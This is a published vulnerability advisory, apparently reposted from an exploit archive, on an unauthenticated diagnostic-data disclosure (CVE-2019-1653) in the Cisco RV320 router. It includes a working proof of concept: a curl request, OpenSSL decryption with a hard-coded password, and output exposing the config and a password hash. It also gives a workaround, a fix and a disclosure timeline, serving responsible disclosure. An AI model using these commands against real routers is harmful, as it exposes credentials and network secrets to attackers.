@@ -1,0 +1,139 @@
+id: 32052
+date: 01/24/2019
+title: Cisco RV320 Unauthenticated Diagnostic Data Retrieval Vulnerability
+author: RedTeam
+cves: CVE-2019-1653
+
+
+Product: Cisco RV320 Dual Gigabit WAN VPN Router, possibly others
+Affected Versions: 1.4.2.15, 1.4.2.17
+Fixed Versions: since 1.4.2.19
+Vulnerability Type: Information Disclosure
+Security Risk: high
+Vendor URL: https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190123-rv-info
+Vendor Status: fixed version released
+Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2018-003
+Advisory Status: published
+CVE: CVE-2019-1653
+CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1653
+
+
+Introduction
+============
+
+"Keep your employees, your business, and yourself productive and
+effective. The Cisco RV320 Dual Gigabit WAN VPN Router is an ideal
+choice for any small office or small business looking for performance,
+security, and reliability in its network."
+(from the Cisco RV320 product page [1])
+
+
+More Details
+============
+
+The Cisco RV320 Dual Gigabit WAN VPN Router provides a web-based
+configuration interface. In the device's firmware, this functionality is
+implemented using a variety of CGI programs. Access to this web
+interface requires prior authentication using a username and password.
+RedTeam Pentesting discovered the CGI program:
+
+/cgi-bin/export_debug_msg.exp
+
+This program can be used to retrieve various diagnostic information from
+the device, which includes its current configuration. In contrast to
+other functions, this CGI program does not require any form of
+authentication. It may be accessed through the router's web server,
+which is available from the LAN by default. As described in [2],
+firmware versions from 1.4.2 to 1.4.2.15 (including) also expose the web
+server to the WAN on TCP port 8007.
+
+
+Proof of Concept
+================
+
+The diagnostic data can be retrieved by issuing an HTTP POST request to
+the vulnerable CGI program. OpenSSL is used to decrypt the data with the
+hard-coded password "NKDebug12#$%" before unpacking it with tar (output
+shortened):
+
+------------------------------------------------------------------------
+$ curl --data submitdebugmsg=1 \
+  'http://192.168.1.1/cgi-bin/export_debug_msg.exp' > debug
+
+$ openssl aes-128-cbc -salt -md md5 -d \
+  -k 'NKDebug12#$%' < debug > debug.tgz
+
+$ mkdir output && tar -xf debug.tgz -C output/
+
+$ ls -1 output/
+debug_messages.txt
+etc.tgz
+nk_sysconfig
+var.tgz
+
+$ cat output/nk_sysconfig
+####sysconfig####
+[VERSION]
+VERSION=73
+MODEL=RV320
+SSL=0
+IPSEC=0
+PPTP=0
+PLATFORMCODE=RV0XX
+[...]
+[SYSTEM]
+HOSTNAME=router
+DOMAINNAME=example.com
+DOMAINCHANGE=1
+USERNAME=cisco
+PASSWD=066bae9070a9a95b3e03019db131cd40
+[...]
+------------------------------------------------------------------------
+
+
+Workaround
+==========
+
+Prevent untrusted clients from connecting to the device's web server.
+
+
+Fix
+===
+
+Install firmware version 1.4.2.19 (or later) on the router.
+
+
+Security Risk
+=============
+
+This vulnerability is rated as a high risk as it exposes sensitive
+diagnostic information, such as the device's configuration, to
+untrusted, potentially malicious parties. By retrieving this
+information, attackers can obtain internal network configuration, VPN or
+IPsec secrets, as well as password hashes for the router's user
+accounts. Knowledge of a user's password hash is sufficient to log into
+the router's web interface. Any information obtained through
+exploitation of this vulnerability can be used to facilitate further
+compromise of the device itself or attached networks.
+
+
+Timeline
+========
+
+2018-09-19 Vulnerability identified
+2018-09-27 Customer approved disclosure to vendor
+2018-09-28 Vendor notified
+2018-10-05 Receipt of advisory acknowledged by vendor
+2018-10-05 Notified vendor of disclosure date: 2019-01-09
+2018-11-18 List of affected versions provided by vendor
+2018-12-21 Postponing disclosure to 2019-01-23, as requested by vendor
+2019-01-23 Advisory published
+
+
+References
+==========
+
+[1] https://www.cisco.com/c/en/us/products/routers/rv320-dual-gigabit-wan-vpn-router/index.html
+[2] https://bst.cloudapps.cisco.com/bugsearch/bug/CSCvg42801
+
+#  0day.today [2023-03-25]  #
